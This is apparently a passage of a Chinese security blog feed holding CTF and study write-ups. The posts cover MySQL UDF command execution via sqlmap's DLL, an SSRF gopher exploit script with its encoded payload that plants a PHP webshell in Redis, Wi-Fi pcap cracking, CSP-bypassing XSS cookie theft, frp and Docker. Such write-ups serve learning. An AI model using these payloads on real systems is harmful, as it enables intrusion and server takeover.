href="https://www.jianshu.com/p/5b34c1b6dee7">https://www.jianshu.com/p/5b34c1b6dee7</a><br>什么是UDF？<br>UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。通过动态库方式实现<br>首先通过注入获取mysql账号密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;MySQL 5.6 and below</span><br><span class="line">select host, user, password from mysql.user;</span><br><span class="line">&#x2F;&#x2F;MySQL 5.7 and above</span><br><span class="line">select host, user, authentication_string from mysql.user;</span><br></pre></td></tr></table></figure><p>有列数限制的话就group_concat(c1,c2,c3 separator ‘-‘)<br>拿到密码后去搜一下md5值。。这里默认root root<br>然后远程连接mysql<br>看一下secure_file_priv<br>接下来就把对应mysql版本的dll文件传上去 位数查看命令：show variables like ‘%version_%’；，位数不对使用dll文件的时候会报错！！！一定注意<br>我这里是64位，就传64位的了，传之前需要用sqlmap的dll，但是异或编码，需要解码，解码也在sqlmap里面。<br>python cloak.py -d -i  …/64/lib_mysqludf_sys.dll_<br>解码后上传到数据库对应的位置里面去<br>这里我上传出了点问题，太离谱了。<br>我不太会用loadfile，所以把文件通过010editor，转为16进制导出，然后在notepad去掉空格和换行符(匹配’\r\n’),然后<br>select unhex(‘data’) into dumpfile ‘path/plugin/udf.dll’<br>接下来，create function sys_eval returns string soname “udf.dll”;<br>之后就可以愉快地在mysql里面使用系统权限执行命令了。</p><img src="http://cdn.polowong.top/static/images/udf.png">]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>apache、nginx、iis日志浅析</title>
      <link href="2020/06/17/%E6%97%A5%E5%BF%97%E6%B5%85%E6%9E%90/"/>
      <url>2020/06/17/%E6%97%A5%E5%BF%97%E6%B5%85%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="小知识："><a href="#小知识：" class="headerlink" title="小知识："></a>小知识：</h1><p>常见的Linux发行版本：<br>Redhat、Ubuntu、CentOS、SuSE、Gentoo、Debian、Fedora、<br>最近hw面试问到的问题，特地整理一下。</p><h1 id="Find命令"><a href="#Find命令" class="headerlink" title="Find命令"></a>Find命令</h1><p>面试里面问我怎么用find命令找nginx的日志文件（先问的我nginx的日志文件叫啥。。我不知道。。尴尬）然后提示我是.log结尾，然后我就说了<br>find / -name “<em>.log” 没想到害蒙对了… 准确的表述应该是 find /var/log/nginx -name “</em>.log”<br>这里说一下find命令的一些用法。<br>-exec/-ok都是执行命令，不过-ok会先给出提示，让用户确定是否执行。<br>find . -perm 777 -exec ls -l {} ;<br>-perm 是按照权限进行查找<br>比如  find / -perm 777</p><h1 id="Linux权限"><a href="#Linux权限" class="headerlink" title="Linux权限"></a>Linux权限</h1><p>顺便说一下Linux权限问题<br>RWX read-write-execute对应权值为4-2-1<br>所以chmod 777的意思就是说给所有的用户可读可写可执行的权限（危险<br>每个7分别对应User、Group、Other的权限。</p><h1 id="Apche、Nginx、IIS日志"><a href="#Apche、Nginx、IIS日志" class="headerlink" title="Apche、Nginx、IIS日志"></a>Apche、Nginx、IIS日志</h1><p>Apache:<br>centos配置文件：/etc/httpd/conf/httpd.conf<br>Ubuntu配置文件：/etc/apache2/apache2.conf<br>日志文件的配置在httpd.conf中。<br>apache日志记录了客户端ip、时间、方法、请求资源、status code、content length等信息。<br>Windows平台的日志位置默认在apache/logs/access.log error.log<br>在基于Debian的Linux上(Ubuntu)，系统范围的Apache错误日志默认位置是/var/log/apache2/error.log<br>在基于 Red Hat 的Linux中(centos)，系统范围的 Apache 错误日志文件默认被放置在/var/log/httpd/error_log<br>Nginx:<br>Windows：logs/access.log<br>Linux:/var/log/nginx/access.log<br>默认配置文件：/etc/nginx/nginx.conf<br>IIS:<br>IIS6 默认情况下 IIS日志文件目录 为  C:\windows\system32\LogFiles<br>IIS7.5 默认情况下IIS日志目录为 “%SystemDrive%\inetpub\logs\LogFiles” 其中%SystemDrive% 表示系统安装位置，一般指 C: 盘，点击“浏览”按钮可自定义存放IIS日志目录。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈SSRF与redis及其相关问题</title>
      <link href="2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/"/>
      <url>2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是Redis"><a href="#什么是Redis" class="headerlink" title="什么是Redis"></a>什么是Redis</h1><p>  Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached 一样，为了保证效率，数据都是缓存在内存中。区别的是 redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。</p><h2 id="Redis漏洞"><a href="#Redis漏洞" class="headerlink" title="Redis漏洞"></a>Redis漏洞</h2><p>Redis会因为配置不当而产生漏洞。<br>Redis默认监听端口为 0.0.0.0:6379,默认没有设置密码认证，这意味着redis服务器暴漏在公网并且可以被操作。<br>Redis未授权漏洞利用情况有如下几种<br>1.敏感数据泄露<br>2.写shell<br>3.把公钥写入authorized_keys，可以登录主机。（需要Redis以root权限运行）<br>4.contrab反弹shell</p><h2 id="Redis漏洞利用"><a href="#Redis漏洞利用" class="headerlink" title="Redis漏洞利用"></a>Redis漏洞利用</h2><p>对于未授权访问的情况，可以获取到Redis服务器ip后在本地远程连接Redis服务器，也可以构造数据包向Redis服务器发送恶意代码。</p><h1 id="SSRF与各种协议"><a href="#SSRF与各种协议" class="headerlink" title="SSRF与各种协议"></a>SSRF与各种协议</h1><p>SSRF全程为 Server-Side-Request-Forgery 服务器端请求伪造，即为通过服务器对内网资源进行一些请求，可以进行文件读取，内网扫描、主机探测、漏洞利用等活动。</p><h2 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h2><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它。<br>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议<br>gopher协议格式：URL:  gopher://<host>:<port>/<gopher-path>_UrlEncodedTCPStream</p><h2 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h2><p>curl支持file协议，可以通过file协议LFI。file:///etc/passwd</p><h2 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h2><p>curl支持dict协议，可以通过dict协议探测服务信息。<br>curl dict://127.0.0.1:22</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>GKCTF-2020 EasyWeb<br>这道题拿到手没啥思路 看到源码提示了secret之后发现是ifconfig<br>然后就使用burp扫一下内网，发现一台173.187.36.11这台服务器的报错是redis的报错。<br>然后爆破扫一下端口，发现是默认的6379。<br>接下来考虑SSRF打内网未授权Redis。<br>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.216.189.11&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line"> <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line"> <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line"> <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line"> <span class="string">&quot;save&quot;</span></span><br><span class="line"> ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">cmd+=CRLF</span><br><span class="line"><span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">payload += urllib.quote(redis_format(x))</span><br><span class="line"><span class="built_in">print</span> payload</span><br></pre></td></tr></table></figure><p>替换url和payload即可<br>生成payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;173.187.36.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure><p>然后访问<a href="http://redis_ip/shell.php%E5%8D%B3%E5%8F%AFgetflag">http://redis_ip/shell.php即可getflag</a></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/">https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/</a><br><a href="https://www.gem-love.com/ctf/2361.html#EZ%E4%B8%89%E5%89%91%E5%AE%A2EzNode">https://www.gem-love.com/ctf/2361.html#EZ%E4%B8%89%E5%89%91%E5%AE%A2EzNode</a><br><a href="https://zhuanlan.zhihu.com/p/112055947">https://zhuanlan.zhihu.com/p/112055947</a><br><a href="https://www.freebuf.com/column/158065.html">https://www.freebuf.com/column/158065.html</a><br><a href="https://www.freebuf.com/vuls/162035.html">https://www.freebuf.com/vuls/162035.html</a><br><a href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/">https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> buuoj </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶臭数据包</title>
      <link href="2020/06/06/%E6%81%B6%E8%87%AD%E6%95%B0%E6%8D%AE%E5%8C%85/"/>
      <url>2020/06/06/%E6%81%B6%E8%87%AD%E6%95%B0%E6%8D%AE%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h1 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h1><p>下载完数据包之后，protocol全都是802.11，考虑数据包被加密了，接下来进行解密。<br>使用aircrack-ng 对数据包进行解密，使用的字典为fuzzdict wifipwdtop2000。</p><img src="http://cdn.polowong.top/static/images/ec1.png"><p>跑出来wifi密码为12345678，结合SSID对数据包进行解密。</p><h1 id="数据包解密"><a href="#数据包解密" class="headerlink" title="数据包解密"></a>数据包解密</h1><p>首选项-协议-IEEE802.11-编辑decryption keys。<br>type选择wpa-pwd,格式为  wifi密码:SSID<br>也可以从<a href="https://www.wireshark.org/tools/wpa-psk.html">https://www.wireshark.org/tools/wpa-psk.html</a> 根据wifi密码和SSID生成PSK，type选择PSK就好。<br>点击确认后就可以在数据包页面看到解密的分组了。<br>首先过滤http和tcp分组，语法为：http and tcp<br>过滤后发现有上传图片的分组，遂过滤之，取其数据并导出。<br>导出方法：<br>选择分组，在分组详情那选中media type 就可以自动选择媒体数据。 然后右键导出分组字节流就可以导出图片了。</p><h1 id="图片分析"><a href="#图片分析" class="headerlink" title="图片分析"></a>图片分析</h1><p>习惯性地丢到binwalk分析，分离出来一个压缩包，有密码，不是伪加密，考虑从数据包找答案。<br>其实做到这里有点没思路了，看了看解析发现接下来做下去要看session。session是JWT格式，<br>还原地址：<a href="https://www.jstoolset.com/jwt">https://www.jstoolset.com/jwt</a><br>还原后：<img src="http://cdn.polowong.top/static/images/jwt1.png"><br>提示压缩包密码是刚才ping过的一个网站，于是搜索icmp协议，但是没有。</p><h1 id="柳暗花明"><a href="#柳暗花明" class="headerlink" title="柳暗花明"></a>柳暗花明</h1><p>去ping域名的话会先进行dns解析，于是过滤dns协议，在最后一个dns协议包里面找到ping的域名，作为压缩包密码填进去，得到flag。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSP-XSS Bypass</title>
      <link href="2020/06/02/CSP-XSS-Bypass/"/>
      <url>2020/06/02/CSP-XSS-Bypass/</url>
      
        <content type="html"><![CDATA[<p>参考链接：<br><a href="https://www.zhihu.com/question/21979782">https://www.zhihu.com/question/21979782</a><br><a href="https://xz.aliyun.com/t/5084#toc-2">https://xz.aliyun.com/t/5084#toc-2</a><br><a href="https://www.cnblogs.com/thenbz3/p/11863641.html">https://www.cnblogs.com/thenbz3/p/11863641.html</a></p><h1 id="CSP的概念"><a href="#CSP的概念" class="headerlink" title="CSP的概念"></a>CSP的概念</h1><p>CSP 是 Content Security Policy 的缩写，即内容安全策略。CSP旨在减少XSS攻击，具体原理是通过设置response header或者在页面中使用meta标签规定受信任的、可执行的JS、图片、iframe、style来源。<br>任何不符合CSP规则的资源都将无法被加载。</p><h1 id="CSP示例"><a href="#CSP示例" class="headerlink" title="CSP示例"></a>CSP示例</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; </span><br><span class="line">style-src cdn.example.org third-party.org; child-src https:</span><br></pre></td></tr></table></figure><p>资源限制类型（引用）：<br>script-src：外部脚本 指定了允许从哪里加载JS脚本<br>style-src：样式表<br>img-src：图像<br>media-src：媒体文件（音频和视频）<br>font-src：字体文件<br>object-src：插件（比如 Flash）<br>child-src：框架<br>frame-ancestors：嵌入的外部资源<br>connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）<br>worker-src：worker脚本<br>manifest-src：manifest 文件<br>default-src ‘self’ 该属性值为self时只允许本站资源加载。设置了这个就为上述属性设置了默认值‘self’<br>上述属性如果不明确指定的话则默认范围是*，即允许所有。<br>script-src属性里面 设置unsafe-inline 允许内嵌的脚本及样式 不写这个默认不允许。<br>script-src属性里面 设置unsafe-eval   允许通过字符串动态创建的脚本执行，比如 eval，setTimeout 等。不写这个默认不允许。<br>script-src ‘nonce-EDNnf03nceIOfn39fn3e9h3sdfa’ 这句话的意思是说只允许nonce值为EDNnf03nceIOfn39fn3e9h3sdfa的脚本执行。(<script nonce="EDNnf03nceIOfn39fn3e9h3sdfa">xxx</script>) 同理也可以设置hash值。</p><h1 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a>CSP绕过</h1><p>CSP绕过我只使用过一种方法，就是Location.href，其他的方法暂时没有尝试过，在 <a href="https://xz.aliyun.com/t/5084#toc-2">https://xz.aliyun.com/t/5084#toc-2</a> 这篇文章里面写的挺多的，可以仔细阅读。<br>另外一种我感觉有意思的绕过就是CRLF注入绕过，在CSP之前找到CRLF注入点来两个CRLF把CSP挤到body里面。。高，实在是高</p><h1 id="CSP-BYPASS实例"><a href="#CSP-BYPASS实例" class="headerlink" title="CSP BYPASS实例"></a>CSP BYPASS实例</h1><p>这道题是CSICN_华东北赛区_WEB2 在buuoj有复现。<br>其他的点我看网上都说的差不多了 唯独CSP Bypass说的不详细，这里我详细说一下CSP绕过，其他的不仔细说，就简要说一下如何成功拿到flag。<br>有个投稿和反馈，说了管理员会查看，猜测XSS拿cookie。提交申请时需要爆破md5，好说，写脚本即可。<br>先尝试随便投稿<br>投稿后查看页面，发现存在CSP，所以需要绕过csp。<br>接下来进行XSS，由于过滤了很多关键字，所以考虑HTML实体编码—把字母转ascii并在前面加上&amp;#后面加上;<br><svg>标签可以嵌入JS代码。<br>直接用XSS平台的payload的话会这样：</p><img src="http://cdn.polowong.top/static/images/csp1.png"><p>接下来使用location.href绕过。<br>爆破完md5后管理员点击完在XSS平台就收到cookie啦。<br>接下来是联合注入，最后一句话是-1 union select 1,2,flagg  from ciscn.flag，得到flag</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题时隔一年才弄明白CSP是怎么回事，属实我的问题，继续学习，继续努力。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frp内网穿透</title>
      <link href="2020/06/01/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
      <url>2020/06/01/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/fjh1997/article/details/100850756">https://blog.csdn.net/fjh1997/article/details/100850756</a><br><a href="https://zhuanlan.zhihu.com/p/45445979">https://zhuanlan.zhihu.com/p/45445979</a><br>最近在搭建学校的网络安全训练平台，使用的是CTFD+CTF-Whale组件生成动态独立靶机，由此引发了对内网穿透的思考。<br>首先理解什么是内网穿透</p><h1 id="内网穿透的概念"><a href="#内网穿透的概念" class="headerlink" title="内网穿透的概念"></a>内网穿透的概念</h1><p>了解内网穿透前，需要了解内网穿透这个需求出现的原因。<br>ipv4地址稀缺，于是出现了NAT,NAPT技术实现IP”复用”。<br>NAT：<br>将私网地址通过NAT网关转换成公网地址，同时通信的数量受NAT网关公网地址数限制。<br>NAPT:<br>将私网地址和端口号通过NAPT网关转换成公网地址：端口号，NAPT网关维护一张映射表，记录公网ip:port和私网ip:port的对应关系。<br>这样可以大幅度降低对公网IP的需求量。<br>为什么需要内网穿透？<br>我家电脑是移动的，没有给分配独立的公网IP，我在本机搭建的http服务无法被公网看到。为了解决这类问题，内网穿透技术应需求而生。<br>比如访问我家电脑8888端口的web服务，直接访问我ipip.net看到的ip地址:8888是无法访问的，因为NAT网关没有8888出站记录   的映射关系。<br>内网穿透概念（复制）：<br>内网穿透是我们在进行网络连接时的一种术语，也叫做NAT穿透，即在计算机是局域网内的时候，外网与内网的计算机的节点进行连接时所需要的连接通信，有时候就会出现内网穿透不支的情况。内网穿透的功能就是，当我们在端口映射时设置时，内网穿透起到了地址转换的功能，也就是把公网的地址进行翻译，转成为一种私有的地址，然后再采用路由的方式ADSL的宽带路由器，具有一个动态或者是固定的公网IP，最后ADSL直接在交换机上，这样所有的电脑都可以共享上网。内网穿透除了可以实现内网之间机器的网络通信功通之外，还可以解决UDP中出现的数据传输不稳定问题。<br>看了两张图感觉写的比较好</p><img src="http://cdn.polowong.top/static/images/nwct1.png"><img src="http://cdn.polowong.top/static/images/nwct2.png"><h1 id="内网穿透的思路"><a href="#内网穿透的思路" class="headerlink" title="内网穿透的思路"></a>内网穿透的思路</h1><p>内网电脑主动发消息给公网服务器，相当于公网服务器在转发内网服务器的数据，使用第三台机器访问公网服务器的时候即可访问内网服务器提供的服务。这受公网服务器带宽限制。</p><h1 id="内网穿透实现（frp）"><a href="#内网穿透实现（frp）" class="headerlink" title="内网穿透实现（frp）"></a>内网穿透实现（frp）</h1><p>网络结构： 服务器为Windows10，移动大内网xD,服务器是我科学上网用的vps，有独立的公网IP。<br>软件安装：首先在github上下载对应系统架构的frp，Windows比较好选，我出问题的是vps的版本选择，一开始选的是amd64版本，但是无法执行bin file,使用arch命令查看架构后才发现架构为i686，是32位系统。。。哎。<br>软件配置：    软件配置参考<a href="https://zhuanlan.zhihu.com/p/45445979">https://zhuanlan.zhihu.com/p/45445979</a>  这里不想在详细展开说，注意几点，就是不能人家写什么你就写什么，需要明白各个配置的意义，否则你搁这穿什么呢？<br>vhost_http_port 参数配置的是web服务的端口，需要在frpc客户端定义domain（没有的话就写服务器ip），指明本地web服务端口。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker技术原理浅析</title>
      <link href="2020/05/29/Docker%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
      <url>2020/05/29/Docker%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>参考链接：<br><a href="https://www.zhihu.com/question/331023021">https://www.zhihu.com/question/331023021</a><br><a href="https://www.zhihu.com/question/48174633/answer/616413576">https://www.zhihu.com/question/48174633/answer/616413576</a><br>别人说的话我就不复制粘贴了，挑一些我个人认为比较有意思的点和比较基础的点说一下。</p><h1 id="docker的一些概念"><a href="#docker的一些概念" class="headerlink" title="docker的一些概念"></a>docker的一些概念</h1><h2 id="image"><a href="#image" class="headerlink" title="image"></a>image</h2><p> image是一堆只读层的统一视角，UFS技术可以把这一对只读层整合成一个文件系统</p><h2 id="container"><a href="#container" class="headerlink" title="container"></a>container</h2><p> 容器就是在image上面加了一个可读可写层。<br>container=image+ R&amp;W Layer<br>docker start=docker create &amp; docker run</p><h2 id="Repository"><a href="#Repository" class="headerlink" title="Repository"></a>Repository</h2><p> Repository意思为仓库，类似github上面有很多代码可以clone到本地，在docker中就相当于可以pull镜像到本地。官方的仓库是docker hub</p><h2 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h2><p> Registry是私有仓库，Registry包含了一个或多个Repository，每个Repository可以有多个Tag，每个Tag对应一个image。<br>我理解的docker是”轻量级”虚拟机。这个概念应该不是正确的，因为虚拟机和docker的区别还是挺大的，再多抽象几层我感觉这么理解也可以<br>docker的方便之处在于不需要像虚拟机一样重新虚拟出来硬件和操作系统，docker只需要pull镜像直接用就行。<br>docker可以快速部署的另一个原因除了是分层可复用之外，就是可以”一键”安装所需依赖。我理解的是类似makefile。<br>dockerfile类似makefile，但是一个dockerfile对应一个容器或者说对应着一个服务（如MySQL）然后docker-compose.yml 包含一个个dockerfile文件形成了一个工程。<br>docker 进程会对每个容器的资源进行管理。<br>docker的镜像分层我认为是比较有意思的，有点类似面向对象编程思想的”继承”。<br>docker的基础镜像应该是最大的，但是从基础镜像新建一个镜像的话，并不需要复制所有内容，即不需要占用两倍的存储空间，只需要把不一样的保存下来就好。<br>这得益于Linux的COW策略。即：没写过文件的不用动，写过的文件保存成新的文件。<br>docker会在容器最上层创建一个读写层，用来保存对基础镜像的修改操作操作的文件。</p><h1 id="docker与虚拟机的区别"><a href="#docker与虚拟机的区别" class="headerlink" title="docker与虚拟机的区别"></a>docker与虚拟机的区别</h1><p>首先是虚拟化层次不一样。虚拟机完整地虚拟了内核和用户空间，而docker仅仅是虚拟了用户空间，内核用的是操作系统的内核。每个容器只是说相互之间的应用、依赖不同，但其最底层的镜像应该是相同的。他们用共同一个基础镜像，对基础镜像有修改，这个修改保存到各个容器内部，docker进程对容器之间进行隔离。<br>docker启动速度快，占用资源少；而虚拟机启动速度慢，消耗资源多。<br>这里引用两句话，感觉说的非常好：<br>“其实最大的区别在于应用场景的不同：虚拟机最开始出现是为了模拟不同的硬件平台，但是现在云计算时代是为了提供的计算能力的虚拟化，这样可以快速灵活的划分和分配计算资源。容器则是随着应用程序的架构发展所自然衍生出来的东西。当软件越来越复杂，单体应用没法再发展下去了，每个功能逐渐独立出来，出现面向服务的架构，进而出现所谓微服务的架构。“</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSON&amp;JSONP&amp;CSRF</title>
      <link href="2020/05/22/JSON-JSONP-CSRF/"/>
      <url>2020/05/22/JSON-JSONP-CSRF/</url>
      
        <content type="html"><![CDATA[<p>参考链接：<br><a href="https://cloud.tencent.com/developer/article/1516219">https://cloud.tencent.com/developer/article/1516219</a><br><a href="https://blog.csdn.net/u011089760/article/details/93550458">https://blog.csdn.net/u011089760/article/details/93550458</a><br><a href="https://blog.csdn.net/qq_37133717/article/details/105749589">https://blog.csdn.net/qq_37133717/article/details/105749589</a><br><a href="https://blog.csdn.net/tianjindong0804/article/details/84971922">https://blog.csdn.net/tianjindong0804/article/details/84971922</a><br><a href="https://archive.phocean.net/2013/10/13/csrf-with-jsonp.html">https://archive.phocean.net/2013/10/13/csrf-with-jsonp.html</a></p><h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><p>谈jsonp之前，首先明白什么是json。<br>json全称JavaScript Object Notation，JS对象标记，是一种轻量级的数据交换方式，JSON最常用的是对象的键值对，有点像python中dict数据结构。<br>例如{“k1”:”v1”,”k2”:”v2”}</p><h2 id="JSON-Hijacking"><a href="#JSON-Hijacking" class="headerlink" title="JSON Hijacking"></a>JSON Hijacking</h2><p>JSON劫持通过诱导用户点击恶意文件，重写Array()构造函数的方法，将json数据发送给攻击者。<br>JSON劫持步骤（参考）<br>1）重新定义数组构造函数Array = function() 并将数组赋值给我们定义的全局变量；</p><p>2）向目标网站发送一条请求，借用被攻击者的session权限；</p><p>3）将获得的数据赋给yourData，从而进行任意处理。</p><p>其中第一步的函数覆盖是关键，可以JS中的方法覆盖的特性或者使用JS的特殊方法Object.prototype.__defineSetter__等。（这个函数在新版chrome和firefox已失效。）</p><h1 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h1><p>什么是JSONP？JSONP是带有填充（Padding）的JSON数据。<br>JSONP为了解决跨域问题，我们知道，JS,XHR(AJAX)可以发起跨域请求，但是拿不到跨域请求的资源（或者说看不到响应、拿不到响应数据）</p><img src="http://cdn.polowong.top/static/images/jsonp1.png"><p>JSONP最大的特征是回传。<br>使用方法为在页面中加入&lt;script&gt;标签,src属性为请求的JS资源的URL，最后加上回调函数的名称，比如<br>请求URL为：<a href="http://www.test.io/1.php?callback=cb">www.test.io/1.php?callback=cb</a><br>然后在当前页面需要写一个JS函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 